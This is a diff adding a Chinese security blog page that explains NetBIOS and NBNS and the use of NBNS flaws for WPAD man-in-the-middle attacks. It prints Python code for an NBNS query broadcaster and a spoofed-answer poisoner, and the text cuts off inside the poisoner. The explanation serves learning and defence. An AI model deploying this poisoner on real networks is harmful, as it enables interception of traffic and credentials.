@@ -1,0 +1,549 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/global/favicon.ico">
+  <link rel="icon" href="/img/global/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="eW1z4rd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="本文阐述了 NetBIOS 框架下的相关协议的区别， 重点对 NBNS 协议进行了分析，同时提出了针对 NBNS 协议缺陷进行 WPAD 中间人攻击的思路。 0x00 NetBIOS 相关协议NetBIOS（Network Basic Input&#x2F;Output System，网络基本输入输出系统），一般指用于局域网通信的一套API（严格的说 NetBIOS 并不是一个网络协议），提供了一种允许局域">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用 NBNS 协议缺陷进行 WPAD 中间人攻击">
+<meta property="og:url" content="https://ew1z4rd.github.io/post/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="栖丘">
+<meta property="og:description" content="本文阐述了 NetBIOS 框架下的相关协议的区别， 重点对 NBNS 协议进行了分析，同时提出了针对 NBNS 协议缺陷进行 WPAD 中间人攻击的思路。 0x00 NetBIOS 相关协议NetBIOS（Network Basic Input&#x2F;Output System，网络基本输入输出系统），一般指用于局域网通信的一套API（严格的说 NetBIOS 并不是一个网络协议），提供了一种允许局域">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ew1z4rd.github.io/post/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/%E5%88%A9%E7%94%A8%20NBNS%20%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8C%20WPAD%20%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/1562905742768.png">
+<meta property="article:published_time" content="2019-08-05T11:50:23.000Z">
+<meta property="article:modified_time" content="2022-01-30T03:11:37.258Z">
+<meta property="article:author" content="eW1z4rd">
+<meta property="article:tag" content="exploit">
+<meta property="article:tag" content="concept">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ew1z4rd.github.io/post/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/%E5%88%A9%E7%94%A8%20NBNS%20%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8C%20WPAD%20%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/1562905742768.png">
+  
+  
+  <title>利用 NBNS 协议缺陷进行 WPAD 中间人攻击 - 栖丘</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"ew1z4rd.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":"f307ed711fcf86fe5ceb149239b6cfc3","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>eW1z4rd&#39;s space</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/global/post-bg.webp') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="利用 NBNS 协议缺陷进行 WPAD 中间人攻击">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-08-05 19:50" pubdate>
+        2019年8月5日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      7k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      59 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">利用 NBNS 协议缺陷进行 WPAD 中间人攻击</h1>
+            
+            <div class="markdown-body">
+              <p>本文阐述了 NetBIOS 框架下的相关协议的区别， 重点对 NBNS 协议进行了分析，同时提出了针对 NBNS 协议缺陷进行 WPAD 中间人攻击的思路。</p>
+<h3 id="0x00-NetBIOS-相关协议"><a href="#0x00-NetBIOS-相关协议" class="headerlink" title="0x00 NetBIOS 相关协议"></a>0x00 NetBIOS 相关协议</h3><p><strong>NetBIOS（Network Basic Input/Output System，网络基本输入输出系统）</strong>，一般指用于局域网通信的一套<strong>API</strong>（严格的说 NetBIOS 并不是一个网络协议），提供了一种允许局域网内不同电脑能够建立和使用连接服务的功能。</p>
+<p><strong>NetBEUI（NetBIOS Enhanced User Interface，NetBIOS 增强用户接口）</strong>，可以看作是 NetBIOS 协议的<strong>扩展</strong>版本，主要用于小型局域网中的主机通信，目前基本已经淘汰。</p>
+<span id="more"></span>
+
+<blockquote>
+<p>注：NetBIOS 和 NetBEUI，都是基于以太网广播的，也就是只能识别 MAC 地址，没有更高层的协议头部（如 IP、TCP/UDP），所以是无法通过路由器的。</p>
+</blockquote>
+<p><strong>NBT（NetBIOS over TCP/IP，简称 NBT 或者 NetBT）</strong>，是一个网络协议，允许以前使用 NetBIOS API 的应用程序能够在 TCP/IP 协议栈中使用。如今，NBT 已经逐渐地<strong>代替</strong> NetBIOS 成为主流协议，因为它不仅适用于以太网，更适用于现代的 TCP/IP 网络。</p>
+<blockquote>
+<p><em>Wireshark</em> 中是这样解释的：<em>NetBIOS over TCP/IP (also called NBT) seems to slowly supersede all the other NetBIOS variants.</em></p>
+<p>译：NetBIOS over TCP/IP 也叫做 NBT，已经逐渐淘汰并取代其他的 NetBIOS 变形协议或扩展协议。</p>
+</blockquote>
+<p>NetBIOS 和 NBT 的具体关系如图所示：</p>
+<p>![img](/img/利用 NBNS 协议缺陷进行 WPAD 中间人攻击/382300-20160109151303168-1561702700.gif)</p>
+<p>图1：NetBIOS over TCP/IP 协议栈</p>
+<p>如上图所示，<strong>NBT 是一个框架</strong>，提供了三种不同的服务，即 <strong>NBNS、NBDS、NBSS</strong> 三个协议。</p>
+<blockquote>
+<p>注：在使用 Wireshark 等抓包工具来捕获数据包时，是抓不到 NBT 协议的数据包的，只能抓到 NBNS、NBDS、NBSS 这三种协议的数据包。</p>
+</blockquote>
+<p>协议的具体描述如下：</p>
+<ul>
+<li><p><strong>NBNS（NetBIOS Name Service，NetBIOS 名称服务器）</strong>，类似于 DNS 服务，使用 UDP/137 或 TCP/137 端口，在基于 NetBIOS 名称访问的网络上提供名称注册和名称解析服务，<strong>通常也被称为 NBT-NS</strong>。关闭 137 端口，则无法使用 WINS 服务。</p>
+<blockquote>
+<p>Microsoft 的 NBNS 实现称为 WINS（Windows Internet Name Service，Windows网络名称服务）</p>
+</blockquote>
+</li>
+<li><p><strong>NBDS（NetBIOS Datagram Service，NetBIOS 数据报服务器）</strong>，使用 UDP/138 端口，主要用于提供 NetBIOS 环境下的计算机名浏览功能，很少使用。</p>
+<blockquote>
+<p>如果非法入侵者可以与目标主机的 138 端口建立连接请求，就能轻易获得目标主机所处的局域网网络名称以及目标主机的计算机名称。</p>
+</blockquote>
+</li>
+<li><p><strong>NBSS（NetBIOS Session Service，NetBIOS 会话服务器）</strong>，使用 TCP/139 端口建立可靠的、基于连接的通信，主要用于 Windows “文件和打印机共享” 和 Linux Samba 服务。关闭 139 端口，则无法在 PC 间共享文件和打印机。</p>
+</li>
+</ul>
+<p><strong>SMB（Server Message Block，服务器信息块）</strong>，是一个应用层的协议，主要用于提供网络中文件共享、文件打印和进程间通信等功能，如今 SMB 主要使用于 Windows 系统中。</p>
+<p>SMB 协议有两种运行方式，第一种通过 NetBIOS API，使用的是 UDP/137 和 UDP/138 端口以及 TCP/137 和 TCP/139 端口，如下图所示：</p>
+<p>![img](/img/利用 NBNS 协议缺陷进行 WPAD 中间人攻击/382300-20160109151306934-1336561833.gif)</p>
+<p>图2：使用 NetBIOS 实现的 SMB</p>
+<p>第二种是直接运行在 TCP 和 UDP 协议之上，使用的是 <strong>445</strong> 端口，也被称为*”Direct hosting of SMB over TCP/IP”*。</p>
+<blockquote>
+<p>默认 Windows 系统都支持 SMB 协议，Linux 系统没有相关组件，需要使用 Samba 服务实现 SMB 协议。</p>
+</blockquote>
+<h3 id="0x01-NBNS-协议分析"><a href="#0x01-NBNS-协议分析" class="headerlink" title="0x01 NBNS 协议分析"></a>0x01 NBNS 协议分析</h3><p>NetBIOS 协议的概念定义在 <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1001">RFC 1001</a> 中、实现细节定义在 <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1002">RFC 1002</a> 中，文档里详细的介绍了有关于 NetBIOS、NBNS 协议的结构，配置以及安全性等内容。</p>
+<p><strong>NBNS 的协议结构如下图所示：</strong></p>
+<p>![1562904209741](/img/利用 NBNS 协议缺陷进行 WPAD 中间人攻击/1562904209741.png)</p>
+<p>图3：NBNS 协议结构</p>
+<p>NBNS 的协议结构与 LLMNR 基本一致，可以参考 <a href="https://ew1z4rd.github.io/2019/08/02/%E5%88%A9%E7%94%A8-LLMNR-%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/">利用 LLMNR 名称解析缺陷劫持内网指定主机会话</a> 中对 LLMNR 协议的解析。不同之处在于 NBNS 协议中的主机名称是经过<strong>编码</strong>的，而 LLMNR 中是以明文传递，在 Python 的 dpkt 库中有实现其编码和解码的源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_name</span>(<span class="hljs-params">name</span>):</span><br><span class="hljs-string">&quot;&quot;&quot;Return the NetBIOS first-level encoded name.&quot;&quot;&quot;</span><br>l = []<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> struct.pack(<span class="hljs-string">&#x27;16s&#x27;</span>, name):<br>    c = <span class="hljs-built_in">ord</span>(c)<br>    l.append(<span class="hljs-built_in">chr</span>((c &gt;&gt; <span class="hljs-number">4</span>) + <span class="hljs-number">0x41</span>))<br>    l.append(<span class="hljs-built_in">chr</span>((c &amp; <span class="hljs-number">0xf</span>) + <span class="hljs-number">0x41</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(l)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode_name</span>(<span class="hljs-params">nbname</span>):</span><br><span class="hljs-string">&quot;&quot;&quot;Return the NetBIOS first-level decoded nbname.&quot;&quot;&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(nbname) != <span class="hljs-number">32</span>:<br>    <span class="hljs-keyword">return</span> nbname<br>l = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">2</span>):<br>    l.append(<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(nbname[i]) - <span class="hljs-number">0x41</span>) &lt;&lt; <span class="hljs-number">4</span>) |<br>                 ((<span class="hljs-built_in">ord</span>(nbname[i+<span class="hljs-number">1</span>]) - <span class="hljs-number">0x41</span>) &amp; <span class="hljs-number">0xf</span>)))<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(l).split(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure>
+
+<p>使用 Wireshark 可以快速抓取到 NBNS 协议的数据包，如下图：</p>
+<p><img src="%E5%88%A9%E7%94%A8%20NBNS%20%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8C%20WPAD%20%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/1562905742768.png" srcset="/img/loading.gif" lazyload alt="1562905742768"></p>
+<p>图4：经过编码后的主机名称</p>
+<h3 id="0x02-NBNS-名称解析过程"><a href="#0x02-NBNS-名称解析过程" class="headerlink" title="0x02 NBNS 名称解析过程"></a>0x02 NBNS 名称解析过程</h3><p>NBNS 名称解析的具体过程可以查看 [Windows 名称解析机制探究及缺陷利用](./Windows 名称解析机制探究及缺陷利用)，一种常见的名称解析过程及利用如下图所示：</p>
+<p>![img](/img/利用 NBNS 协议缺陷进行 WPAD 中间人攻击/20171207135158-bd391ebe-db12-1.png)</p>
+<p>图5：NetBIOS 名称解析过程 </p>
+<h3 id="0x03-Python-实现-NetBIOS-协议的质询与应答"><a href="#0x03-Python-实现-NetBIOS-协议的质询与应答" class="headerlink" title="0x03 Python 实现 NetBIOS 协议的质询与应答"></a>0x03 Python 实现 NetBIOS 协议的质询与应答</h3><p>NBNS 协议的质询过程实际上就是进行了一个广播，质询的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> socket, struct<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NBNS_Query</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,name</span>):</span><br>        self.name = name<br>        self.populate()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">populate</span>(<span class="hljs-params">self</span>):</span><br>        self.HOST = <span class="hljs-string">&#x27;192.168.16.255&#x27;</span><br>        self.PORT = <span class="hljs-number">137</span><br>        self.nqs = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br><br>        self.QueryData = (<br>        <span class="hljs-string">&quot;\xa9\xfb&quot;</span>  <span class="hljs-comment"># Transaction ID</span><br>        <span class="hljs-string">&quot;\x01\x10&quot;</span>  <span class="hljs-comment"># Flags Query</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>  <span class="hljs-comment"># Question:1</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Answer RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Authority RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Additional RRS</span><br>        <span class="hljs-string">&quot;\x20&quot;</span>      <span class="hljs-comment"># length of Name:32</span><br>        <span class="hljs-string">&quot;NAME&quot;</span>      <span class="hljs-comment"># Name   </span><br>        <span class="hljs-string">&quot;\x00&quot;</span>      <span class="hljs-comment"># NameNull</span><br>        <span class="hljs-string">&quot;\x00\x20&quot;</span>  <span class="hljs-comment"># Query Type:NB</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>) <span class="hljs-comment"># Class</span><br><br>        self.data = self.QueryData.replace(<span class="hljs-string">&#x27;NAME&#x27;</span>, struct.pack(<span class="hljs-string">&quot;32s&quot;</span>, self.encode_name(self.name)))<br><br>    <span class="hljs-comment"># From http://code.google.com/p/dpkt/</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_name</span>(<span class="hljs-params">self,name</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;Return the NetBIOS first-level encoded name.&quot;&quot;&quot;</span><br>        l = []<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> struct.pack(<span class="hljs-string">&#x27;16s&#x27;</span>, name):<br>            c = <span class="hljs-built_in">ord</span>(c)<br>            l.append(<span class="hljs-built_in">chr</span>((c &gt;&gt; <span class="hljs-number">4</span>) + <span class="hljs-number">0x41</span>))<br>            l.append(<span class="hljs-built_in">chr</span>((c &amp; <span class="hljs-number">0xf</span>) + <span class="hljs-number">0x41</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(l)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;NBNS Querying... -&gt; %s&quot;</span> % self.name<br>            self.nqs.sendto(self.data, (self.HOST, self.PORT))<br>        self.nqs.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    nbns = NBNS_Query(<span class="hljs-string">&quot;WPAD&quot;</span>)<br>    nbns.Query()<br></code></pre></td></tr></table></figure>
+
+<p>NBNS 应答数据包的具体代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> socket, struct,binascii<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NBNS_Answer</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, addr</span>):</span><br><br>        self.IPADDR  = addr<br>        self.nas = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>        self.init_socket()<br>        self.populate()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">populate</span>(<span class="hljs-params">self</span>):</span><br><br>        self.AnswerData = (<br>        <span class="hljs-string">&quot;TID&quot;</span>              <span class="hljs-comment"># Transaction ID</span><br>        <span class="hljs-string">&quot;\x85\x00&quot;</span>         <span class="hljs-comment"># Flags Query</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>         <span class="hljs-comment"># Question</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>         <span class="hljs-comment"># Answer RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>         <span class="hljs-comment"># Authority RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>         <span class="hljs-comment"># Additional RRS</span><br>        <span class="hljs-string">&quot;\x20&quot;</span>             <span class="hljs-comment"># length of Name:32</span><br>        <span class="hljs-string">&quot;NAME&quot;</span>             <span class="hljs-comment"># Name   </span><br>        <span class="hljs-string">&quot;\x00&quot;</span>             <span class="hljs-comment"># NameNull</span><br>        <span class="hljs-string">&quot;\x00\x20&quot;</span>         <span class="hljs-comment"># Query Type:NB</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>         <span class="hljs-comment"># Class</span><br>        <span class="hljs-string">&quot;\x00\x00\x00\xa5&quot;</span> <span class="hljs-comment"># TTL</span><br>        <span class="hljs-string">&quot;\x00\x06&quot;</span>         <span class="hljs-comment">#</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>         <span class="hljs-comment"># Null</span><br>        <span class="hljs-string">&quot;IPADDR&quot;</span>)          <span class="hljs-comment"># IP Address</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_socket</span>(<span class="hljs-params">self</span>):</span><br>        self.HOST = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>        self.PORT = <span class="hljs-number">137</span><br>        self.nas.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        self.nas.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="hljs-number">255</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode_name</span>(<span class="hljs-params">self, nbname</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;Return the NetBIOS first-level decoded nbname.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(nbname) != <span class="hljs-number">32</span>:<br>            <span class="hljs-keyword">return</span> nbname<br>        l = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">2</span>):<br>            l.append(<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(nbname[i]) - <span class="hljs-number">0x41</span>) &lt;&lt; <span class="hljs-number">4</span>) |<br>                         ((<span class="hljs-built_in">ord</span>(nbname[i+<span class="hljs-number">1</span>]) - <span class="hljs-number">0x41</span>) &amp; <span class="hljs-number">0xf</span>)))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(l).split(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Answser</span>(<span class="hljs-params">self</span>):</span><br>        self.nas.bind((self.HOST, self.PORT))<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Listening...&quot;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>            data, addr = self.nas.recvfrom(<span class="hljs-number">1024</span>)<br>            tid  = data[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]           <br>            name = data[<span class="hljs-number">13</span>:<span class="hljs-number">45</span>]<br>            data = self.AnswerData.replace(<span class="hljs-string">&#x27;TID&#x27;</span>, tid)<br>            data = data.replace(<span class="hljs-string">&#x27;NAME&#x27;</span>, name)<br>            data = data.replace(<span class="hljs-string">&#x27;IPADDR&#x27;</span>, socket.inet_aton(self.IPADDR))<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Poisoned answer(%s) sent to %s for name %s &quot;</span> % 